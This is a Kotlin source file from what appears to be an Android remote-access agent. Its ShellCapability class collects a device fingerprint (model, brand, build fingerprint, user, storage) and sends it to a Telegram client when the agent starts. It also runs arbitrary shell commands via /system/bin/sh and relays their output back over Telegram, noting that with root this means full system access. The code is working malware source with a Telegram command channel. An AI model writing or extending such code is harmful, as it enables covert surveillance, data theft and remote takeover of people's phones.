package com.example.agent.capabilities

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import androidx.core.content.ContextCompat
import com.example.agent.TelegramClient
import com.example.agent.ErrorReporter
import java.util.concurrent.TimeUnit

class ShellCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    // ─────────────────────────────────────────────
    // SYSINFO: full device fingerprint
    // Sent automatically when agent starts
    // ─────────────────────────────────────────────
    fun sysInfo() {
        // Use app-specific storage directory (modern API)
        val storageDir = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ctx.getExternalFilesDir(null) ?: ctx.filesDir
        } else {
            Environment.getExternalStorageDirectory()
        }

        var stat: StatFs? = null
        try {
            stat = StatFs(storageDir.path)
        } catch (e: Exception) {
            // Fallback to internal storage
            try { stat = StatFs(ctx.filesDir.path) } catch (ex: Exception) { ErrorReporter.report(ex, "ShellCapability") }
        }

        val freeMb = stat?.availableBlocksLong?.times(stat.blockSizeLong)?.div(1024 * 1024) ?: 0
        val totalMb = stat?.blockCountLong?.times(stat.blockSizeLong)?.div(1024 * 1024) ?: 0

        telegram.sendText("""
📱 SYSTEM INFO
━━━━━━━━━━━━━━━━━━━
Model:    ${Build.MODEL}
Brand:    ${Build.BRAND}
Android:  ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
Build:    ${Build.FINGERPRINT}
User:     ${Build.USER}
Storage:  ${freeMb}MB free / ${totalMb}MB
━━━━━━━━━━━━━━━━━━━
        """.trimIndent())
    }

    // ─────────────────────────────────────────────
    // SHELL: run any shell command
    // Android shell is limited without root
    // With root: full system access
    // ─────────────────────────────────────────────
    fun run(cmd: String): String {
        var process: Process? = null
        var caughtException: Exception? = null
        val result = try {
            process = ProcessBuilder("/system/bin/sh", "-c", cmd)
                .redirectErrorStream(true)
                .start()

            val output = process.inputStream.bufferedReader().use { it.readText() }
            val timedOut = !process.waitFor(30, TimeUnit.SECONDS)

            if (timedOut) {
                process.destroy()
                "[timed out after 30s]\n$output"
            } else {
                output.ifBlank { "[no output — exit code: ${process.exitValue()}]" }
            }
        } catch (e: Exception) {
            caughtException = e
            "[error: ${e.message}]"
        } finally {
            try {
                process?.destroy()
                process?.inputStream?.close()
                process?.errorStream?.close()
                process?.outputStream?.close()
            } catch (_: Exception) {}
        }
        telegram.sendText(result)
        caughtException?.let { ErrorReporter.report(it, "ShellCapability") }
        return result
    }
}
